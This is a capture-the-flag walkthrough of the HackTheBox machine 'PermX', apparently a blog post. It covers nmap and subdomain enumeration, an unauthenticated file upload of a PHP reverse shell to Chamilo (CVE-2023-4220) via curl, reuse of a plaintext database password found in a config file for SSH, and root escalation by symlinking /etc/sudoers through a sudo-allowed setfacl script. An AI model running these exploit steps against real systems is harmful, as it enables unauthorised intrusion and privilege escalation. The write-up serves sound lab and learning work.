# Initial Reconnaissance: Nmap Scan

Before running any scans, I like to store the target machine's IP address in a file:

```bash
$ echo "10.129.195.217" >> ip
```

This way, I can easily retrieve the IP whenever needed using `$(cat ip)`.

**Let's run the Nmap scan:**

```bash
$ sudo nmap -sS -sV -sC -p- $(cat ip) -oN nmap/permx.out
```

### Breakdown of the command
- **`-sS`**: TCP SYN scan (half-open scan).
- **`-sV`**: Enable version detection.
- **`-sC`**: Run default Nmap scripts.
- **`-p-`**: Scan all 65535 ports.
- **`$(cat ip)`**: Retrieve the target IP address from the `ip` file.
- **`-oN nmap/permx.out`**: Output results to `nmap/permx.out` in normal format.

### Results

```bash

```

The results for the scan show two ports open:
- **`22/tcp ssh`**
- **`80/tcp http`**

This helps us narrow down the attack surface to the web services and SSH. Considering I don't have access to the SSH backdoor planted by the NSA, we need to try and get into this machine through the webserver.

```bash
80/tcp open  http    Apache httpd 2.4.52

|_http-server-header: Apache/2.4.52 (Ubuntu)

```
we can see that in order to access the webpage, we need  to add permx.htb to /etc/hosts. 

```bash
$ sudo su
$ echo "$(cat ip)   permx.htb" >> /etc/hosts
```
Testing the domain:
```bash
$ ping permx.htb -c 3

# Directory and Subdomain Enumeration
After checking the webpage with my browser and finding little of interest, we will enumerate the website's directories to ensure we aren't missing anything important.

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://permx.htb -o gobuster.out

Unfortunately, Gobuster didn't yield much useful information, so we'll proceed with subdomain enumeration using FFuF. I find FFuF to be quite elegant and prefer to use it, although similar results could be achieved with Gobuster.

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -fw 18 -o ffuf-subdomain.out

The subdomain enumeration revealed two subdomains:

- `lms.permx.htb`
- `www.permx.htb`

This provides us with additional potential entry points to explore.

## Chamilo on LMS.permx.htb
Visiting `lms.permx.htb` leads us to a Chamilo login portal. Despite enumerating the website further and finding many listed directories, I couldn't locate any version numbers for Chamilo. 

Ultimately, I Googled **Chamilo Exploit** and discovered a variety of Remote Code Execution (RCE) exploits related to a recent Chamilo vulnerability under **CVE-2023-4220**.

I settled for [this](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc) exploit by m3m0o and you can read about how to manually exploit this vulnerability [here](https://github.com/dollarboysushil/Chamilo-LMS-Unauthenticated-File-Upload-CVE-2023-4220). In this blog, I won't cover the automated exploit in detail as it is straightforward.
# Successfully Establishing a Connection
## Manual exploitation
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Update the IP and port number in the file and upload it to the target using the command below.

```bash
$ curl -F 'bigUploadFile=@reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded
```

### Setting up listener with Penelope.py
I've been experimenting with Penelope after discovering it in a LinkedIn post. I find it very useful as it automatically upgrades my shell, which simplifies my work.
```bash
$ python /opt/penelope/penelope.py 
[+] Listening for reverse shells on 0.0.0.0 üö™4444 
‚û§  üíÄ Show Payloads (p) üè† Main Menu (m) üîÑ Clear (Ctrl-L) üö´ Quit (q/Ctrl-C)
```

### Triggering the exploit
To trigger the exploit, navigate to:
`http://<website>/main/inc/lib/javascript/bigupload/files/ `
and open the `.php` file you just uploaded.
```bash
[+] Got reverse shell from üêß permx.htb~10.129.195.217 üíÄ - Assigned SessionID <1>

```

# User flag
when the shell spawns, you can see that you are logged in as www-data, 
lets have a look at `/var/www/chamilo` as this is where the learning platform is located. 

As I have done boxes like this before, i know that the chances of us finding the right credentials on the box is very high. usually there is a pair of credentials that is used for database configuration, or sometimes the user's credentials are stored with a breakable hash or even clear case. so i need to comb through  all of these files and see if my eye catches anything. 

There are three ways we can do this:
1. **Manually going through the readable files**:
    - Open and inspect each file for potential credentials.
2. **Using grep to search for the word "password"**: 
	- `grep -arin -o -E '(\w+\w){0,5}password(\W+\w){0,5}' . `
	
3. **Using an automation script like [PEASS-ng](https://github.com/peass-ng/PEASS-ng)**
	- Download and run the PEASS-ng script to automate the search for credentials and other useful information.
## Manually going through the readable files
While inspecting the configuration files for Chamilo, we come across `cli-config.php`. Upon further investigation, we see it tries to pull credentials from another file.

```php
$database = new \Database();
$dbParams = [
    'driver' => 'pdo_mysql',
    'host' => $_configuration['db_host'],
    'user' => $_configuration['db_user'],
    'password' => $_configuration['db_password'],
    'dbname' => $_configuration['main_database'],
];
```
It appears these values are sourced from `./app/config/configuration.php`, as evidenced by the following lines of code:
```php
$configurationFile = __DIR__.'/app/config/configuration.php';

if (!is_file($configurationFile)) {
    echo "File does not exists: $configurationFile";
    exit();
}
```

Upon examining `./app/config/configuration.php`, we quickly locate the `db_user` and `db_password`:

```php
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```
With these credentials, we can potentially access the Chamilo database and further our exploitation efforts.
## Attempting to Access the Database
Upon attempting to connect to MySQL, we quickly encounter an "Access Denied" error for the `www-data` user, indicating that this user does not have the necessary permissions. 
```bash
www-data@permx:~/chamilo$ mysql
ERROR 1698 (28000): Access denied for user 'www-data'@'localhost'
```

## Checking for Other Users
By reviewing the `/etc/passwd` file, we notice another user present on the system named `mtz`.
```bash
www-data@permx:~/chamilo$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
```

## Attempting SSH with Found Credentials
Let's try to SSH into the `mtz` account using the password we discovered in the Chamilo configuration file.
```bash
$ ssh mtz@permx.htb
The authenticity of host 'permx.htb (10.129.195.240)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'permx.htb' (ED25519) to the list of known hosts.
mtz@permx.htb's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
mtz@permx:~$ 
```
Now that we have successfully logged in as the `mtz` user, we can proceed to grab the user flag.

```bash
mtz@permx:~$ ls
user.txt
```
With access to the `mtz` account, we have successfully moved further into the system.
# Privilege Escalation 
First, let's check the sudo permissions for the user `mtz`:
```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```
From the sudo permissions, we can see that `mtz` has unrestricted access to run `/opt/acl.sh` without needing a password. Let's examine the contents of this script to understand its functionality:

```bash
mtz@permx:~$ cat /opt/acl.sh 
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

This script modifies the access control list (ACL) of a specified file to change its permissions for a particular user. It only allows changes to files within the `/home/mtz` directory and prevents the use of parent directory references (`..`).

To exploit this, we can use a technique involving symbolic links. By creating a symbolic link to a directory that the compromised user controls and placing it in their home directory, we can manipulate the permissions of files. Here's how to replicate this technique:
# Root Flag
1. **Create a symbolic link to the `sudoers` file:**
```bash
mtz@permx:~$ ln -s /etc/sudoers escalate
```
2. **Use the `/opt/acl.sh` script to change the permissions of the symbolic link:**
```bash
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/escalate 
```
3. **Edit the `sudoers` file through the symbolic link to grant `mtz` root privileges:**
```bash
mtz@permx:~$ vim escalate 

# Inside `vim`, add the following line to grant `mtz` root privileges without requiring a password:

mtz ALL=(ALL) NOPASSWD:ALL
```

4. **Switch to the root user:**
```bash
mtz@permx:~$ sudo su
[sudo] password for mtz: 
root@permx:/home/mtz# 
root@permx:/home/mtz# cd
root@permx:~# ls
backup  reset.sh  root.txt
root@permx:~# 
```
By following these steps, you have successfully escalated privileges to root and accessed the root flag.
